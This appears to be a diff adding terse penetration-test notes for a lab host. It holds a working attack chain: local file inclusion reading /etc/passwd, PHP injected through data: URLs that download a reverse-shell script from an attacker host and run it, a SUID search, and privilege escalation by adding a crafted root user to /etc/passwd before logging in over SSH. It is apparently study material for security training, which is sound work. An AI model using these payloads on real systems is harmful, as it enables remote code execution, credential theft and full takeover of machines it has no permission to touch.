@@ -1,0 +1,21 @@
+http://10.11.1.35/section.php?page=alldocs
+
+http://10.11.1.35/section.php?page=/etc/passwd
+
+http://10.11.1.35/section.php?page=data:text/plain,<?php echo shell_exec("curl http://IP/reverseshell.sh --output /tmp/reverseshell.sh");?>
+
+http://10.11.1.35/section.php?page=data:text/plain,<?php echo shell_exec("bash /tmp/reverse.sh");?>
+
+privesc
+
+find / -perm -u=s -type f 2>/dev/null
+
+SUID: /usr/bin/cp 
+
+openssl passwd -1 -salt pwn pass123
+
+insert in passwd:
+
+pwn:$1$pwn$22.CgYt2uMolqeatCk9ih/:0:0:root:/root:/bin/bash
+
+ssh pwn@10.11.1.35 whit pass123
